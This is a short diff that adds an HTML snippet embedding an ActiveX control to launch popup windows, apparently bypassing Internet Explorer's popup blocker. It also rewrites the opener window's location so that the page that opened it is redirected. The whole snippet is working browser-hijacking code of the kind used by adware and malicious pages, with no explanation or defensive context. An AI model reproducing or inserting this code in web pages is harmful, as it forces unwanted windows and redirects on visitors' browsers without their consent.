@@ -1,0 +1,23 @@
+<OBJECT id=stb height=1 width=11 
+classid=clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A><PARAM NAME="ActivateActiveXControls" VALUE="1"><PARAM
+
+NAME="ActivateApplets" VALUE="1"></OBJECT>
+
+
+<SCRIPT> 
+        function pop(){
+stb.DOM.Script.setTimeout("window.open('http://www.baidu.com','_blank',',resizable=yes,scrollbars=yes,toolbar=yes,menubar=yes,location=yes,status=yes,directories=yes');")
+}
+        setTimeout('pop();',0);
+         </SCRIPT>
+<SCRIPT>                                     
+if(parent.window.opener) parent.window.opener.location='http://www.baidu.com';
+</SCRIPT>
+<SCRIPT language=javascript>
+var leave=true; 
+function stbs() { 
+if (leave) 
+stb.DOM.Script.window.open('http://www.baidu.com','_blank');
+}
+
+</SCRIPT>
